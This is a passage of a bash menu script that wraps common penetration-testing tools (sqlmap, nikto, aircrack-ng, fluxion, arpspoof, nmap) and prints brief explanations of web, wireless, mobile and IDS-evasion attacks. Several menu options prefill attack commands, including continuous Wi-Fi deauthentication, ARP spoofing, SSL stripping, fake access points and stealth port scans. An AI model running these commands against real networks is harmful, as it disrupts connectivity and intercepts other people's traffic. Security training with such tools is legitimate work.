	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man ferret;;
		 2) ferret ;; 
		 0) main_menu
	      continue ;;
		 esac ;;
	      3) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man sslstrip;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Port Number:=";sleep 0.10
		       read y
		       sslstrip -l  $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       sslstrip $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      4) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man juggernaut;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name:=";sleep 0.10
		       read y
		       juggernaut $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       juggernaut $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      0) main_menu 
	         continue ;;
		 esac ;;
	   0) main_menu
              continue ;;
	   esac ;;
       10) echo "===================================================================================================================================="
	   echo -e "\e[32m				*** HACKING WEBSERVERS ***";echo "  ";sleep 0.10
	   echo -e "\e[33m1.ABOUT";sleep 0.10
	   echo "2.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "\e[33mToday, most online services are implemented as web applications. Online banking, web search engines, email applications, and social networks are just a few examples of such web services. Web content is generated in real time by a software application running at server-side. So hackers attack on the web server to steal credential information, passwords, and business information by using DoS (DDos) attacks, SYN flood, ping flood, port scan, sniffing attacks, and social engineering attacks. In the area of web security, despite strong encryption on the browser-server channel, web users still have no assurance 1.ABOUT what happens at the other end.
		    As a penetration tester and ethical hacker of an organization, you must provide security to the company's web server. You must perform checks on the web server for vulnerabilities, misconfigurations, unpatched security flaws, and improper authentication with external systems.

Links:-
https://www.greycampus.com/.../ethical-hacking/web-server-and-its-types-of-attacks
https://ilabs.eccouncil.org › Ethical Hacking Exercises › Hacking Webservers
https://www.cybrary.it/video/hacking-web-servers-intro/
https://cybersecurityzen.com/secureninjatv-cyber-kung-fu-mod-12-lab-pt-2-hacking-we...";sleep 0.10;;
	   2) echo "===================================================================================================================================="
	      echo -e "\e[33m1.OWASP-ZAP";sleep 0.10
	      echo "2.SQLMAP";sleep 0.10
	      echo "3.DIRBUSTER";sleep 0.10
	      echo "4.DIRB";sleep 0.10
	      echo "0.GO BACK TO MAIN MENU";sleep 0.10
	      read x
	      clear
	      case $x in
	      1) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man owasp-zap;;
		 2) owasp-zap;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      2) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man sqlmap;;
		 2) sqlmap ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      3) echo "===================================================================================================================================="	
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man dirbuster;;
		 2) dirbuster ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      4) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man dirt;;
		 2) dirt ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      0) main_menu 
	         continue ;;
	      esac ;;
	   0) main_menu
	      continue ;;
	   esac ;;
       11) echo "===================================================================================================================================="
       	   echo -e "\e[32m				*** HACKING WEB APPLICATION *** ";echo "  ";sleep 0.10
	   echo -e "\e[33m1.ABOUT";sleep 0.10
	   echo "2.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "\e[33mA web application is an application that is accessed by users over a network such as the Internet or an intranet. The term may also mean a computer software application that is coded in a browser-supported programming language (such as JavaScript, combined with a browser-rendered markup language like HTML) and reliant on a common web browser to render the application executable.
 		    Web hacking refers to exploitation of applications via HTTP which can be done by manipulating the application via its graphical web interface, tampering the Uniform Resource Identifier (URI) or tampering HTTP elements not contained in the URI. Methods that can be used to hack web applications are SQL Injection attacks, Cross Site Scripting (XSS), Cross Site Request Forgeries (CSRF), Insecure Communications, etc.
 		    As an expert Ethical Hacker and Security Administrator, you need to test web applications for cross-site scripting vulnerabilities, cookie hijacking, command injection attacks, and secure web applications from such attacks.

Links:-
https://www.hackingtutorials.org/category/web-application-hacking/
https://ilabs.eccouncil.org › Ethical Hacking Exercises › Hacking Web Applications
https://www.oreilly.com/library/view/hacking-web-applications/9780135261422/
https://www.linkedin.com/learning/ethical-hacking-website-and-web-application-testing";sleep 0.10;;
	   2) echo "===================================================================================================================================="
	      echo -e "\e[33m1.BURPSUITE";sleep 0.10
	      echo "2.VEGA";sleep 0.10
	      echo "3.SEARCHSPLOIT";sleep 0.10
	      echo "4.SQLNINJA";sleep 0.10
	      echo "5.OWASP-ZAP";sleep 0.10
	      echo "6.DIRBUSTER";sleep 0.10
	      echo "7.WPSCAN";sleep 0.10
	      echo "8.NIKTO";sleep 0.10
	      echo "0.GO BACK TO MAIN MENU";sleep 0.10
	      read x
	      clear
	      case $x in
	      1) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man burpsuite;;
		 2) burpsuite;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      2) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man vega;;
		 2) vega ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      3) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man searchsploit;;
		 2) searchsploit;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      4) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man sqlninja;;
		 2) sqlninja ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      5) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man owasp-zap;;
		 2) owasp-zap;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      6) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) dirbuster ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      7) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man wpscan;;
		 2) wpscan ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      8) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man nikto;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name:=";sleep 0.10
		       read y
		       nikto $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       nikto $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      0) main_menu 
	         continue ;;
	      esac ;;
	   0) main_menu
	      continue ;;
	   esac ;;		
       12) echo "===================================================================================================================================="
	   echo -e "\e[32m				*** SQL INJECTION *** ";echo "  ";sleep 0.10
	   echo -e "\e[33m1.ABOUT";sleep 0.10
	   echo "2.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "\e[33mSQL injection is a set of SQL commands that are placed in a URL string or in data structures in order to retrieve a response that we want from the databases that are connected with the web applications. This type of attacks generally takes place on webpages developed using PHP or ASP.NET.
	            An SQL injection attack can be done with the following intentions −
		    1.To dump the whole database of a system,
                    2.To modify the content of the databases, or
		    3.To perform different queries that are not allowed by the application.
This type of attack works when the applications don’t validate the inputs properly, before passing them to an SQL statement. Injections are normally placed put in address bars, search fields, or data fields.
The easiest way to detect if a web application is vulnerable to an SQL injection attack is to 2.USE the " ‘ " character in a string and see if you get any error.

Links:-
https://www.w3schools.com/sql/sql_injection.asp
https://www.incapsula.com/web-application-security/sql-injection.html
https://searchsoftwarequality.techtarget.com/definition/SQL-injection
https://www.trendmicro.com/vinfo/us/security/definition/sql-injection
https://www.coursera.org/lecture/software-security/sql-injection-1HG11";sleep 0.10;;
	   2) echo "===================================================================================================================================="
	      echo -e "\e[33m1.SQLMAP";sleep 0.10
	      echo "2.SQLNINJA";sleep 0.10
	      echo "3.SEARCHSPLOIT";sleep 0.10
	      echo "4.MBD-SQL";sleep 0.10
	      echo "5.OSSCANER";sleep 0.10
	      echo "6.SQLDICT";sleep 0.10
	      echo "0.GO BACK TO MAIN MENU";sleep 0.10
	      read x
	      clear
	      case $x in
	      1) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man sqlmap;;
		 2) sqlmap ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      2) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man sqlninja;;
		 2) sqlninja ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      3) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man searchsploit;;
		 2) searchsploit;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      4) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man mbd-sql;;
		 2) mbd-sql;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      5) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man osscaner;;
		 2) osscaner;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      6) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man sqldict;;
		 2) sqldict;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      0) main_menu 
	         continue ;;
	      esac ;;
	   0) main_menu
	      continue ;;
	   esac ;;
       13) echo "===================================================================================================================================="
	   echo -e "\e[32m				*** WIRELESS HACKING ***";echo "  ";sleep 0.10
	   echo -e "\e[33m1.ABOUT";sleep 0.10
	   echo "2.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1)echo -e "\e[33m A hacker can sniff the network packets without having to be in the same building where the network is located. As wireless networks communicate through radio waves, a hacker can easily sniff the network from a nearby location.Most attackers 2.USE network sniffing to find the SSID and hack a wireless network. When our wireless cards are converted in sniffing modes, they are called monitor mode.
Wired Equivalent Privacy (WEP) is a security protocol that was invented to secure wireless networks and keep them private. It utilizes encryption at the data link layer which forbids unauthorized access to the network.
The key is used to encrypt the packets before transmission begins. An integrity check mechanism checks that the packets are not altered after transmission.
		     Note that WEP is not entirely immune to security problems. It suffers from the following issues −
		     1.CRC32 is not sufficient to ensure complete cryptographic integrity of a packet.
		     2.It is vulnerable to dictionary attacks.
		     3.WEP is vulnerable to Denial of Services attacks too.

Links:-
https://resources.infosecinstitute.com/13-popular-wireless-hacking-tools/
https://www.cybrary.it/0p3n-category/wireless-hacking-and-security/
https://www.darknet.org.uk/category/wireless-hacking/
https://conference.hitb.org/.../sessions/hitb-lab-wireless-hacking-with-hackcube/
https://www.linkedin.com/learning/ethical-hacking-wireless-networks";sleep 0.10;;
	   2) echo "===================================================================================================================================="
	      echo -e "\e[33m1.AIRODUMP-NG";sleep 0.10
	      echo "2.AIRMON-NG";sleep 0.10
	      echo "3.AIRCRACK-NG";sleep 0.10
	      echo "4.AIREPLAY-NG";sleep 0.10
	      echo "5.KISMET";sleep 0.10
	      echo "6.MDK3";sleep 0.10
	      echo "7.WIFITE";sleep 0.10
	      echo "8.FLUXION";sleep 0.10
	      echo "0.GO BACK TO MAIN MENU";sleep 0.10
	      read x
	      clear
	      case $x in
	      1) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man airodump-ng;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Interface Name:=";sleep 0.10
		       read y
		       airodump-ng $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       airodump-ng $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      2) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man airmon-ng;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Interface Name:=";sleep 0.10
		       read a
		       echo "Enter Option(start/stop/check) :=";sleep 0.10
		       read b
		       airmon-ng $b $a ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       airmon-ng $l ;;
		    0) main_menu
		       continue ;;
                    esac ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      3) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man aircrack-ng;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter File name/path:=";sleep 0.10
		       read y
		       aircrack-ng $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       aircrack-ng $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      4) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man aireplay-ng;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter host Mac address:=";sleep 0.10
		       read a
		       echo "Enter station Mac address:=";sleep 0.10
		       read b
		       echo "Enter interface name:=";sleep 0.10
		       read c
		       aireplay-ng --deauth 0 -b $a -c $b $c ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       aireplay-ng $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      5) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man kismet;;
		 2) kismet;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      6) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man mdk3;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Monitor mode Interface Name:=";sleep 0.10
		       read a
		       echo "Enter Fake Acces point Name";sleep 0.10
		       read b
		       mdk3 $a b -n $b ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       mdk3 $l ;;
		    0) main_menu
		       continue ;;
                    esac ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      7) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man wifite;;
		 2) wifite;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      8) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man fluxion;;
		 2) fluxion;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      0) main_menu 
	         continue ;;
	      esac ;;
	   0) main_menu
	      continue ;;
	   esac ;;
       14) echo "===================================================================================================================================="
       	   echo -e "\e[32m				*** MOBILE HACKING ***";echo "  ";sleep 0.10
           echo -e "\e[33m1.ABOUT";sleep 0.10
	   echo "2.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "-\e[33mCellular phone hacking is a questionable practice whereby a third party gains access to an individual’s cellular phone through a variety of methods. The legality of cell phone hacking is heavily dependent on who is doing the hacking. For example, law enforcement and national governments often 2.USE cell phone hacking methods to apprehend criminals and monitor dissidents. 
		    There have been many high profile instances of illegal cell phone hacking, particularly of celebrity phones. In 2007, a former journalist of the tabloid “News of the World” was charged with attempting to hack the phones of royal aides. In 2011, the same tabloid came under fire for hacking the voicemail of a 13 year old girl who was missing, possibly interfering with the investigation into what eventually proved to be her murder.
		    This term is also known as cell phone hacking, cell phone spying, phone hacking, or phreaking.
                    However, more serious instances of cell phone hacking involve hackers:
		    1.Deleting data
		    2.Adding malicious programs
		    3.Gaining access to sensitive information like bank accounts
		    4.Transcribing private conversations
		    5.Storing copies of texts and emails
Links:-
https://www.reveantivirus.com/blog/en/popular-mobile-hacking-tools
https://www.udemy.com/mobile-hacking/
https://download.cnet.com/Mobile-Hacking.../3000-18495_4-77587252.html
Amazing Mobile Hacking Tools and Techniques | Information Security
How to Hack Mobile Phones for Free Internet - Goregaon Sports Club";sleep 0.10;;
	   2) echo "===================================================================================================================================="
	      echo -e "\e[33m1.APKTOOL";sleep 0.10
	      echo "2.WIRESHARK";sleep 0.10
	      echo "3.ADB/KOS FRAMEWORK";sleep 0.10
	      echo "4.ARPSPOOF";sleep 0.10
	      echo "0.GO BACK TO MAIN MENU";sleep 0.10
	      read x
	      clear
	      case $x in
	      1) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man apktool;;
		 2) apktool;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      2) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man wireshark;;
		 2) wireshark ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      3) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man adb;;
		 2) adb ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      4) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man arpspoof;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter HOST IP ADDRESS:=";sleep 0.10
		       read a
		       echo "Enter TARGET IP ADDRESS:=";sleep 0.10
		       read b
		       echo "Enter Interface Name:=";sleep 0.10
		       read c
		       arpspoof -t $b -r $a -i $c ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       whois $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      0) main_menu 
	         continue ;;
	      esac ;;
	   0) main_menu
	      continue ;;
	   esac ;;
       15) echo "===================================================================================================================================="
	   echo -e "\e[32m 				*** FIREWALLS,HONEYPOTS & EVADING IDS *** ";echo "  ";sleep 0.10
           echo -e "\e[33m1.ABOUT IDS";sleep 0.10
	   echo "2.ABOUT FIREWALL";sleep 0.10
	   echo "3.ABOUT HONEYPOT";sleep 0.10
	   echo "4.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "\e[33mIDS(Intrusion Detection System) Software that detects an attack on a network or computer system. A Network IDS (NIDS) is designed to support multiple hosts, whereas a Host IDS (HIDS) is set up to detect illegal actions within the host. Most IDS programs typically 2.USE signatures of known cracker attempts to signal an alert. Others look for deviations of the normal routine as indications of an attack. Intrusion detection is very tricky. Too much analysis can add excessive overhead and also trigger false alarms. Insufficient analysis can overlook a valid attack
.
Links:-
etutorials.org/...Firewalls+Intrusion-Detection+Systems...Honeypots/HONEYPOTS/
https://www.cybrary.it/video/ids-firewalls-honeypots-whiteboard/;;";;
	   2) echo "A firewall is software used to maintain the security of a private network. Firewalls block unauthorized access to or from private networks and are often employed to prevent unauthorized Web users or illicit software from gaining access to private networks connected to the Internet. A firewall may be implemented using hardware, software, or a combination of both.
		    Firewalls generally 2.USE two or more of the following methods:
		    1.Packet Filtering
	    	    2.Application Gateway
		    3.Circuit-Level Gateway
		    4.Proxy Servers
		    5.Stateful Inspection or Dynamic Packet Filtering
This determines whether the information is authorized to cross the firewall into the network.

Links:-
https://www.pluralsight.com/courses/firewalls-intrustion-detection-cnd
https://www.linkedin.com/learning/ethical.../understanding-web-application-firewalls";;
	   3) echo "honeypot is a decoy computer system for trapping hackers or tracking unconventional or new hacking methods. Honeypots are designed to purposely engage and deceive hackers and identify malicious activities performed over the Internet.Multiple honeypots can be set on a network to form a honeynet.
There are two different kinds of honeypots. They are classified based on their deployment method:
1.Production Honeypot: Used by companies and corporations for the purpose of researching the motives of hackers as well as diverting and mitigating the risk of attacks on the overall network.
2.Research Honeypot: Used by nonprofit organizations and educational institutions for the sole purpose of researching the motives and tactics of the hacker community for targeting different networks.
3.Honeypots are not always designed to identify hackers. Honeypot developers are often more interested in getting into the minds of hackers, which then permits them to design more secure systems, as well as to educate other professionals 1.ABOUT the lessons learned through their efforts. Overall, honeypots are considered an effective method to track hacker behavior and heighten the effectiveness of computer security tools.

Links:-
https://www.youtube.com/watch?v=aUb_H0lLxXA";sleep 0.10;;
	   4) echo "===================================================================================================================================="
	      echo -e "\e[33m1.NMAP";sleep 0.10
	      echo "2.VEIL FRAMEWORK";sleep 0.10
	      echo "3.HPING3";sleep 0.10
	      echo "4.ARPSPOOF";sleep 0.10
	      echo "0.GO BACK TO MAIN MENU";sleep 0.10
	      read x
	      clear
	      case $x in
	      1) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man nmap;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "===================================================================================================================================="
		       echo "1.TCP CONNECT / FULL OPEN SCAN ";sleep 0.10
		       echo "2.SYN STEALTH / HALF OPEN SCAN ";sleep 0.10
		       echo "3.UDP SCAN";sleep 0.10
		       echo "4.FIN STEALTH SCAN";sleep 0.10
		       echo "5.PING SCAN";sleep 0.10
		       echo "6.IDLE SCAN / ZOMBIE SCAN ";sleep 0.10
		       echo "7.VERSION SCAN";sleep 0.10
		       echo "8.OS DETECTION";sleep 0.10
		       echo "0.GO BACK TO MAIN MENU";sleep 0.10
		       read a 
		       clear
		       case $a in 
		       1)echo "===================================================================================================================================="
			 echo "1.ABOUT";sleep 0.10
	         	 echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
			 read b
			 clear
			 case $b in
			 1) echo -e "\e[33mA TCP connect requires a full TCP connection to be established and therefore is a slower scan. Ignoring discovery is often required as many firewalls or hosts will not respond to PING, so could be missed unless you select the -Pn parameter. Of course this can make scan times much longer as you could end up sending scan probes to hosts that are not there.";;
			 2) echo -e "\e[33mENTER IP ADDRESS / DOMAIN NAME";sleep 0.10
			    read c
			    sudo nmap -sT $c;;
			 0) main_menu
			    continue ;;
			 esac ;;
		       2)echo "===================================================================================================================================="
			 echo -e "\e[33m1.ABOUT";sleep 0.10
	         	 echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
			 read b
		         clear
			 case $b in
			 1) echo "SYN scan is the default and most popular scan option for good reasons. It can be performed quickly, scanning thousands of ports per second on a fast network not hampered by restrictive firewalls. It is also relatively unobtrusive and stealthy since it never completes TCP connections. SYN scan works against any compliant TCP stack rather than depending on idiosyncrasies of specific platforms as Nmap's FIN/NULL/Xmas, Maimon and idle scans do. It also allows clear, reliable differentiation between the open, closed, and filtered states.";;
			 2) echo "ENTER IP ADDRESS / DOMAIN NAME";sleep 0.10
			    read c
			    sudo nmap -sS $c;;
			 0) main_menu
			    continue ;;
			 esac ;;
		       3)echo "===================================================================================================================================="
			 echo "1.ABOUT";sleep 0.10
	         	 echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
			 read b
			 clear
			 case $b in
			 1) echo "This scan checks to see if there are any UDP ports listening. Since UDP does not respond with a positive acknowledgment like TCP and only responds to an incoming UDP packet when the port is closed, this type of scan can sometimes show false positives. However, it can also reveal Trojan horses running on high UDP ports and hidden RPC services.";;
			 2) echo "ENTER IP ADDRESS / DOMAIN NAME";sleep 0.10
			    read c
			    sudo nmap -sU $c;;
			 0) main_menu
			    continue ;;
			 esac ;;
		       4)echo "===================================================================================================================================="
			 echo "1.ABOUT";sleep 0.10
	         	 echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
			 read b
			 clear
			 case $b in
			 1) echo "The FIN scan sends a packet with only the FIN flag set, the Xmas Tree scan sets the FIN, URG and PUSH flags (see a good TCP/IP book for more details) and the Null scan sends a packet with no flags switched on.These scan types will work against any system where the TCP/IP implementation follows RFC 793. Microsoft Windows does not follow the RFC, and will ignore these packets even on closed ports. This technicality allows you to detect an MS Windows system by running SYN along with one of these scans. If the SYN scan shows open ports, and the FIN/NUL/XMAS does not, chances are you’re looking at a Windows box ";;
			 2) echo "ENTER IP ADDRESS / DOMAIN NAME";sleep 0.10
			    read c
			    sudo nmap -sF $c;;
			 0) main_menu
			    continue ;;
